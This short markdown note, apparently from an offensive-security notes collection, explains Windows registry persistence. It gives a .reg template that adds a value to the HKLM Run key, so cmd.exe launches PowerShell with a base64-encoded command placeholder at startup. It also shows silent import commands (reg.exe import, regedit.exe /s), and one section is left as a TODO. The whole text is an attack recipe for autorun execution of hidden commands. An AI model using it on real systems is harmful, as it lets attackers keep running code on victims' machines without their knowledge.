# Registry Entry

## 01 - Generate Payloads

TODO: Fill in this info

```
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
@=""
"<value_1>"="C:\\Windows\\System32\\cmd.exe /c powershell.exe -e <base64_encoded>"
"<value_n>"=""
```

## 02 - Execute Payloads

```
C:\> reg.exe import file.reg

C:\> regedit.exe /s file.reg
```